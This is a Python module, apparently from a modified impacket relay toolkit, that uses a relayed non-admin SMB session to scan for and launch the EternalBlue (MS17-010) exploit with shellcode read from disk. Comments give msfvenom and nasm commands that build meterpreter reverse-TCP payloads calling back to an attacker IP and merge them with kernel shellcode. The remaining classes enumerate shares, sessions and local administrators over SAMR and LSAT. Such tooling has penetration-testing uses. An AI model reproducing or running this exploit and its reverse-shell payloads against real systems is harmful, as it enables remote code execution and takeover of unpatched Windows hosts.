# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Config utilities
#
# Author:
#  Ronnie Flathers / @ropnop
#
# Description:
#     Helpful enum methods for discovering local admins through SAMR and LSAT

import ntpath
import eternalrelay
import sys
import os

from struct import pack
from impacket.uuid import uuidtup_to_bin

from impacket import smb, smb3, nmb, nt_errors, LOG
from impacket.dcerpc.v5 import transport, srvs, lsat, samr, lsad
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED, NULL

# Create our class for sending EternalBlue through our non-Admin user's authenticated SMB connection
class EternalRelay:

    def __init__(self, smbConnection):

        self.__smbConnection = smbConnection
        self.__samrBinding = r'ncacn_np:445[\pipe\samr]'
        self.__lsaBinding = r'ncacn_np:445[\pipe\lsarpc]'
        self.__netBinding = r'ncacn_np:445[\pipe\netlogon]'
        self.__share = 'IPC$'
        self.__socket = None
        self.__tid = 0
        self.__filename = '\\lsarpc'
        self.__handle = 0

    def __checkSessionContext(self):

        is_guest = self.__smbConnection.isGuestSession()

        return is_guest

    def EternalBlueScanner(self):

        try:
            eternalrelay.scan(self.__smbConnection.getSMBServer(), self.__smbConnection.getRemoteHost())

        except (smb.SessionError, smb3.SessionError) as e:
            raise SessionError(e.get_error_code(), e.get_error_packet())

    def EternalBlueAttack(self):

        try:
            with open('/opt/eternalrelayx/impacket/impacket/examples/ntlmrelayx/utils/shellcode/sc_all.bin', 'rb') as raw_sc:
                sc = raw_sc.read()

                eternalrelay.exploit(self.__smbConnection.getSMBServer(), self.__smbConnection.getRemoteHost(), sc, 5)

        except (smb.SessionError, smb3.SessionError) as e:
            raise SessionError(e.get_error_code(), e.get_error_packet())


# msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=172.16.48.130 LPORT=4444
# msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=172.16.48.130 LPORT=4445
# nasm -f bin /opt/MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
# nasm -f bin /opt/MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
# cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
# cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
# python /opt/MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin ./shellcode/sc_all.bin

# A class method to enumerate SMB shares using the relayed non-Admin user's connection
class EnumShares:

    def __init__(self, smbConnection):

        self.__smbConnection = smbConnection
        self.__samrBinding = r'ncacn_np:445[\pipe\samr]'
        self.__lsaBinding = r'ncacn_np:445[\pipe\lsarpc]'
        self.__netBinding = r'ncacn_np:445[\pipe\netlogon]'


    def getShareNames(self): # Returns list of SMB share names

        share_list = []
        try:
            shares = self.__smbConnection.listShares() #Use the current SMB connection as a regular domain user to list shares

            if shares:
                for i in range(len(shares)):
                    share_list.append(shares[i]['shi1_netname'][:-1])

                return share_list

        except (smb.SessionError, smb3.SessionError) as e:
            raise SessionError(e.get_error_code(), e.get_error_packet())

class EnumSessions:

    def __init__(self, smbConnection):
        self.__smbConnection = smbConnection
        self.__samrBinding = r'ncacn_np:445[\pipe\samr]'
        self.__lsaBinding = r'ncacn_np:445[\pipe\lsarpc]'

    def currentSessions(self): # Get available SMB sessions

        rpctransport = transport.SMBTransport(self.__smbConnection.getRemoteHost(), smb_connection = self.__smbConnection)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(srvs.MSRPC_UUID_SRVS)
        resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 10)

        for session in resp['InfoStruct']['SessionInfo']['Level10']['Buffer']:
            print("host: %15s, user: %5s, active: %5d, idle: %5d" % (
            session['sesi10_cname'][:-1], session['sesi10_username'][:-1], session['sesi10_time'],
            session['sesi10_idle_time']))

        dce.disconnect()

class EnumLocalAdmins:

    def __init__(self, smbConnection):
        self.__smbConnection = smbConnection
        self.__samrBinding = r'ncacn_np:445[\pipe\samr]'
        self.__lsaBinding = r'ncacn_np:445[\pipe\lsarpc]'

    def __getDceBinding(self, strBinding):

        rpc = transport.DCERPCTransportFactory(strBinding)
        rpc.set_smb_connection(self.__smbConnection)

        return rpc.get_dce_rpc()

    def getLocalAdmins(self):

        adminSids = self.__getLocalAdminSids()
        adminNames = self.__resolveSids(adminSids)

        return adminSids, adminNames

    def __getLocalAdminSids(self):

        dce = self.__getDceBinding(self.__samrBinding)
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
        resp = samr.hSamrConnect(dce)
        serverHandle = resp['ServerHandle']

        resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, 'Builtin')
        resp = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, domainId=resp['DomainId'])
        domainHandle = resp['DomainHandle']
        resp = samr.hSamrOpenAlias(dce, domainHandle, desiredAccess=MAXIMUM_ALLOWED, aliasId=544)
        resp = samr.hSamrGetMembersInAlias(dce, resp['AliasHandle'])
        memberSids = []

        for member in resp['Members']['Sids']:
            memberSids.append(member['SidPointer'].formatCanonical())
        dce.disconnect()

        return memberSids

    def __resolveSids(self, sids):

        dce = self.__getDceBinding(self.__lsaBinding)
        dce.connect()
        dce.bind(lsat.MSRPC_UUID_LSAT)
        resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
        policyHandle = resp['PolicyHandle']
        resp = lsat.hLsarLookupSids(dce, policyHandle, sids, lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
        names = []

        for n, item in enumerate(resp['TranslatedNames']['Names']):
            names.append("{}\\{}".format(resp['ReferencedDomains']['Domains'][item['DomainIndex']]['Name'].encode('utf-16-le'), item['Name']))
        dce.disconnect()

        return names
